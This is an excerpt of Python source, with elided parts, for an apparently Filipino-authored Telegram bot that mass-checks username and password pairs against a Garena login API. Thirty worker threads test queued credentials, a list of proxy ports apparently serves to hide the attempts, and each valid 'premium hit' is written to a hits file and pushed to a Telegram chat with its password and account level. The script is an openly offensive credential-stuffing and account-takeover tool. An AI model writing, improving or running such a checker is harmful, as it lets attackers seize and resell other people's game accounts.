...
# Threading at Network Configurations
gen_queue = queue.Queue()
lock = threading.Lock()
is_generating = False

# Idinagdag ang mga saktong ports para sa unibersal na validation protocol
TARGET_PORTS = [80, 8080, 3128, 8888, 1080]
...
def check_garena_api(username, password):
    ...
    try:
        ...
        if res.status_code == 200:
            ...
            if err in ["error_auth", 403, "error_password", "error_param"]:
                return False, None
...
def checker_worker(chat_id):
    ...
    while is_generating:
        try:
            username, password = gen_queue.get(timeout=2)
        except queue.Empty:
            continue
        is_valid, level = check_garena_api(username, password)
        if is_valid:
            with lock:
                hit_data = f"{username}:{password} | Level: {level}\n"
                with open(VALID_HITS_FILE, "a", encoding="utf-8") as f: f.write(hit_data)
                bot.send_message(chat_id, f"🎯 *NEW PREMIUM HIT INJECTED!*\n\n👤 *Account:* `{username}`\n🔑 *Password:* `{password}`\n🛡️ *Level:* `{level}`", parse_mode="Markdown")
        gen_queue.task_done()

def main_menu_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    b1 = types.InlineKeyboardButton("📊 Start Auto-Gen Bulk", callback_data="run_autogen")
    b2 = types.InlineKeyboardButton("🛑 Stop System", callback_data="stop_system")
    b3 = types.InlineKeyboardButton("📥 Download Hits.txt", callback_data="download_hits")
    markup.add(b1, b2)
    markup.add(b3)
    return markup
...
def handle_menu_clicks(call):
    ...
    if call.data == "run_autogen":
        ...
        for _ in range(30): threading.Thread(target=checker_worker, args=(call.message.chat.id,), daemon=True).start()
